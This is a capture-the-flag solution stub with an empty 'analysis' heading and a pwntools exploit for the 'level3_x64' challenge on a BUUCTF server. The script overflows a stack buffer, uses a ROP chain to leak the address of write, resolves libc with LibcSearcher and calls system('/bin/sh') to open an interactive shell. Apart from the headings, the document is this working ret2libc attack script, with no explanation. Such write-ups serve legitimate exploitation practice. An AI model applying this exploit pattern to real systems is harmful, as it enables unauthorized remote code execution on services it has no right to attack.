# 分析

# exp

```Python
from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")
p = remote('node5.buuoj.cn', 26478)
elf = ELF('./level3_x64')
main=elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
pop_rdi=0x4006b3
pop_rsi=0x4006b1
payload1 = flat(cyclic(0x88),p64(pop_rdi),p64(1),p64(pop_rsi),p64(write_got),p64(4),p64(write_plt),p64(main))
p.sendline(payload1)
write_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(write_addr))
libc=LibcSearcher("write",write_addr)
base=write_addr-libc.dump('write')
system_addr=base+libc.dump('system')
bin_sh=base+libc.dump('str_bin_sh')
payload2=flat(cyclic(0x88),p64(pop_rdi),p64(bin_sh),p64(system_addr),p64(main))
p.sendline(payload2)
p.interactive()
```

